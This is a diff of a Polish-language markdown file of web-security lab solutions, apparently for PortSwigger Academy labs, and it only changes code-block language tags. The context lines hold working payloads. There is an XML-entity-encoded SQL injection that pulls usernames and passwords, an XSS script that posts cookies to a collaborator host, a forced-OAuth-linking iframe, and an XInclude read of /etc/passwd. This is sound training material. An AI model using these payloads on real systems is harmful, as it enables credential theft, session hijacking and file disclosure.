@@ -7,11 +7,11 @@ TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encodin
 
 ### SQL injection with filter bypass via XML encoding
 1. StoreId podmieniamy na:
-```
+```xml
 <storeId>&#x31;&#x20;&#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x75;&#x73;&#x65;&#x72;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x7c;&#x7c;&#x20;&#x27;&#x7e;&#x27;&#x20;&#x7c;&#x7c;&#x20;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x64;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x75;&#x73;&#x65;&#x72;&#x73;</storeId>
 ```
 Hackvertor
-```
+```sql
 <storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId>
 ```
 2. Logujemy się jako administrator
@@ -19,7 +19,7 @@ Hackvertor
 ## Cross-site scripting
 ### Exploiting cross-site scripting to steal cookies
 1. Exploit server:
-```js
+```html
 <script>
 fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
 method: 'POST',
@@ -93,7 +93,7 @@ csrf=your-csrf-token&postId=5&name=Carlos+Montoya&email=carlos%40normal-user.net
 ## OAuth authentication
 ### Forced OAuth profile linking
 1. Podczas logowania znajdujemy link łączący konta i podmieniamy go w kodzie poniżej i przeklejamy do exploit servera (dropujemy request, żeby nie został użyty)
-```js
+```html
 <iframe src="https://YOUR-LAB-ID.web-security-academy.net/oauth-linking?code=STOLEN-CODE"></iframe>
 ```
 2. Sprawdzamy czy konta są połączone
@@ -105,7 +105,7 @@ csrf=your-csrf-token&postId=5&name=Carlos+Montoya&email=carlos%40normal-user.net
 ## Essential skills
 ### Discovering vulnerabilities quickly with targeted scanning
 Podnieniamy productId na:
-```
+```html
 <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
 ```
 
